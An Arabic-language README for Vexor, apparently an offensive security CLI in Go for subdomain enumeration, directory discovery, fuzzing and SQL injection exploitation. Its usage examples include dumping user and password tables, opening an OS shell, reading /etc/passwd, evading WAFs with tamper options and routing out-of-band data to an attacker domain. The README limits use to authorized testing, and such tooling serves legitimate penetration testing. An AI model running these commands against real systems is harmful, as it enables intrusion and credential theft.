<p align="center">
  <img alt="Vexor" src="https://img.shields.io/github/license/0xseif-code/vexor?style=flat-square">
  <img alt="Go Version" src="https://img.shields.io/badge/Go-1.21%2B-00ADD8?logo=go&logoColor=white&style=flat-square">
  <img alt="Language" src="https://img.shields.io/badge/Language-العربية%20%7C%20English-9f7be1?style=flat-square">
</p>

```
__   __ _____   __  __  ____    ____
\ \ / /|  ___| | \/ / |  _ \  |  _ \
 \ V / | |_    | |\/| || |_) | | |_) |
  | |  |  _|   | |  | ||  _ <  |  _ <
  |_|  |_|     |_|  |_||_| \_\ |_| \_\
```

# Vexor

**اقرأ هذا الملف بالإنجليزية: [English](README.md)**

**Vexor** أداة سطر أوامر مكتوبة بلغة **Go** لاكتشاف النطاقات الفرعية، واستكشاف
المحتوى على الويب، واختبار الباراميترات (fuzzing)، واختبار حقن SQL
(SQL injection). تُوزَّع كملف واحد ثنائي (single binary) بدون أي تبعيات خارجية.

---

## المزايا

- اكتشاف النطاقات الفرعية: DNS brute-force + crt.sh مع إزالة التكرار، وresolvers مخصّصة
- اكتشاف الدلائل: استكشاف عبر قوائم الكلمات مع فلترة soft-404 والاستكشاف التعاودي (recursion) وقوالب الإضافات وتصفية حسب الحالة والحجم
- اختبار الباراميترات: علامات `FUZZ` في الـ URL والهيدرات والـ body مع قواعد مطابقة وتصفية حسب الحالة والحجم وregex
- محرك حقن SQL: اكتشاف boolean, error, time, union, stacked, OOB ثم استغلال كامل (`--dbs`, `--tables`, `--columns`, `--dump`, `--os-shell`, `--read-file`, `--write-file`)
- مولّد حمولات مدرِك لـ WAF (`--auto-tamper`)، ومخرجات plain/json/csv، وقوائم كلمات SecLists مخزّنة محليًا، وأعلام مشتركة (بروكسي، تزامن، هيدرات)

---

## التثبيت

### الطريقة 1 — `go install`

يتطلب **Go 1.21+**:

```bash
go install github.com/0xseif-code/vexor/cmd/vexor@latest

# تأكّد أن $GOPATH/bin (أو $HOME/go/bin) موجود في PATH
export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
```

تحقّق من التثبيت:

```bash
$ vexor version
Vexor v1.0.0 (build unknown)
```

### الطريقة 2 — من المصدر (`make`)

```bash
git clone https://github.com/0xseif-code/vexor.git
cd vexor

make build          # Linux / macOS → ./bin/vexor
# أو مباشرة: go build -o vexor ./cmd/vexor

# Windows
go build -o vexor.exe ./cmd/vexor

sudo install -m755 bin/vexor /usr/local/bin/    # اختياري: تثبيت النظام
```

### الطريقة 3 — تحميل ملف ثنائي من الإصدارات

حمّل أحدث ملف ثنائي جاهز لمنصّتك من صفحة
[Releases](https://github.com/0xseif-code/vexor/releases). الأسماء بصيغة
`vexor-<os>-<arch>[.exe]`، مثل `vexor-linux-amd64` و `vexor-darwin-arm64`
و `vexor-windows-amd64.exe`.

---

## البدء السريع

```bash
# نزّل قوائم الكلمات مرة واحدة بعد التثبيت
vexor update-wordlists

# أوامر الأداة المتاحة
vexor --help
```

| الأمر | الوصف |
|---|---|
| `vexor subdomain` | اكتشاف النطاقات الفرعية (DNS brute-force + crt.sh) |
| `vexor dir` | اكتشاف الملفات والدلائل على هدف ويب |
| `vexor fuzz` | اختبار الـ URL / الهيدرات / الـ body بعلامات `FUZZ` |
| `vexor sqli` | اكتشاف واستغلال حقن SQL |
| `vexor update-wordlists` | إعادة تنزيل والتحقق من مرآة SecLists المحلية |
| `vexor version` | عرض رقم الإصدار ومعلومات البناء |

### الأعلام العامة (Global flags)

كل الأوامر تشارك نفس أدوات التحكم العامة:

```
--timeout <s>      مهلة الطلب العالمي بالثواني                    (الافتراضي: 10)
--threads <n>      عدد سلاسل التزامن العالمية                     (الافتراضي: 50)
--proxy <url>      بروكسي HTTP/SOCKS5، مثال: http://127.0.0.1:8080
--headers <h>      هيدر مخصّص قابل للتكرار، مثال: -H "User-Agent: custom"
--format <fmt>     صيغة المخرجات: plain, json, csv                (الافتراضي: plain)
--output <file>    حفظ النتائج في ملف (بالإضافة إلى stdout)
--silent           إخفاء الشعار وأشرطة التقدم والرسائل المعلوماتية
--no-color         تعطيل الألوان ANSI
```

النتائج تُكتب دائمًا إلى **stdout** (بدون ألوان ومناسبة للأنابيب) بينما تذهب
السجلات والتقدّم إلى **stderr** — بالتالي `vexor dir -u URL | tee results.txt`
يعمل مباشرة، و `--format json` جاهزة للاستخدام مع `jq`.

---

## أمثلة الاستخدام

### `vexor subdomain`

اكتشاف نشط عبر DNS + سلبي عبر crt.sh:

```bash
$ vexor subdomain -d example.com -s medium --threads 100

[*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
api.example.com
app.example.com
blog.example.com
cdn.example.com
dev.example.com
shop.example.com
...
[+] domain example.com: 42 subdomains (dns=31, crtsh=11) in 12.4s
[+] subdomain enumeration complete: 42 total subdomains in 12.6s
```

استهداف عدة نطاقات من ملف، أو استخدام قائمة كلمات مخصّصة:

```bash
vexor subdomain -l domains.txt -s large
vexor subdomain -d example.com -w my-subdomains.txt
vexor subdomain -d example.com --active-only --resolvers 8.8.8.8:853 --resolvers 1.1.1.1:53
```

### `vexor dir`

اكتشاف المحتوى مع الاستكشاف التعاودي والتصفية:

```bash
$ vexor dir -u https://example.com -x php,js -r --depth 2

[*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
200	2.1 KB	https://example.com/index.php	Home
200	1.4 KB	https://example.com/login.php	Login
302	0 B		https://example.com/admin/	
301	0 B		https://example.com/backup/	
200	3.8 KB	https://example.com/admin/config.php	Configuration
...
[+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
```

تخلّص من النتائج الزائفة بسهولة:

```bash
vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297 -r
vexor dir -u https://example.com --match-status 200,301,302 --rate 100
```

### `vexor fuzz`

علّم مواضع الاختراق بعلامة `FUZZ` — في الـ URL أو الهيدرات أو الـ body:

```bash
$ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500

[*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
[200] https://example.com/api/query?id=admin (id=admin)
[200] https://example.com/api/query?id=debug (id=debug)
[500] https://example.com/api/query?id=__proto__ (id=__proto__)
...
[+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
```

فحص الطريقة + الـ body، وتصفية التشويش:

```bash
vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
```

القوالب المدمجة: `parameters`, `extensions`, `usernames`, `passwords`,
`passwords-large`, `endpoints` — أو مرّر أي مسار ملف كقيمة لـ `-w`.

### `vexor sqli`

الاكتشاف عبر كل الباراميترات (boolean, error, time, union, stacked, inline, OOB):

```bash
$ vexor sqli -u "https://example.com/page?id=1" --level 2

[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
URL query parameter/GET/id technique=error   dbms=mysql confidence=88
POST form parameter/POST/user technique=time      dbms=mysql confidence=76
...
[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
[i] fingerprinted DBMS: mysql
```

ثم استغل أول نقطة تم تأكيدها:

```bash
vexor sqli -u "https://example.com/page?id=1" --dbs
vexor sqli -u "https://example.com/page?id=1" --tables -D shop
vexor sqli -u "https://example.com/page?id=1" --columns -D shop -T users
vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users -C id,username,password
vexor sqli -u "https://example.com/page?id=1" --os-shell
vexor sqli -u "https://example.com/page?id=1" --read-file /etc/passwd
```

يدعم أيضًا طلبات Burp الخام وسلاسل الـ tamper وقنوات الـ out-of-band:

```bash
vexor sqli -r request.txt -p id
vexor sqli -u "https://example.com/page?id=1" --auto-tamper
vexor sqli -u "https://example.com/page?id=1" --tamper space2comment,randomcase
vexor sqli -u "https://example.com/page?id=1" --oob-domain yourdomain.attacker.com
```

### `vexor update-wordlists`

Vexor يخزّن قوائم الكلمات في `~/.vexor/wordlists` ويجلبها من مرآة SecLists.
نفّذه مرة واحدة بعد التثبيت — وفي أي وقت تريد تحديث البيانات:

```bash
$ vexor update-wordlists

[*] re-downloading all wordlists into ~/.vexor/wordlists
[*] downloading...  65.30% (18.4 MB / 28.2 MB)
[+] wordlist cache updated: 3 files in 46.8s
[i]   directory/medium    8.2 MB  sha256=9f1e4c22a1b3
[i]   subdomain/large    14.3 MB  sha256=4c8d0e71f5a2
[i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
```

> الأوامر `subdomain` و `dir` و `fuzz` تختار قائمة الكلمات تلقائيًا حسب الحجم
> (`-s small|medium|large`) أو مسار صريح (`-w`).

---

## صيغ المخرجات

```bash
# JSON، مرّرها إلى jq
vexor subdomain -d example.com --format json | jq -r '.subdomain'

# CSV إلى جدول بيانات
vexor dir -u https://example.com --format csv -o results.csv

# الصيغة العادية تعمل دائمًا؛ stdout يبقى مناسبًا للأنابيب
vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
```

---

## هيكلة المشروع

```
cmd/vexor/        نقطة الدخول للـ CLI (أوامر Cobra)
internal/fuzz/    محرك اختبار الباراميترات
internal/sqli/    اكتشاف واستغلال حقن SQL
internal/enum/    اكتشاف النطاقات الفرعية والدلائل
internal/httpclient/  عميل HTTP سريع ومتزامن
internal/wordlists/   مرآة SecLists المحلية والتحقق من التكامل
```

---

## تنبيه قانوني (Legal & Disclaimer)

**استخدم الأداة بمسؤولية. للاختبار المأذون فقط.**

Vexor أداة أمنية هجومية. يُسمح باستخدامها فقط ضد أنظمة تملكها أو تملك إذنًا
كتابيًا صريحًا لاختبارها. الوصول غير المصرح به إلى أنظمة الكمبيوتر غير قانوني
في معظم الدول. لا يتحمّل المؤلف أي مسؤولية عن سوء الاستخدام.

## الترخيص

تُوزَّع الأداة بموجب [MIT License](LICENSE). الحقوق محفوظة © (c) 2026 0xseif-code.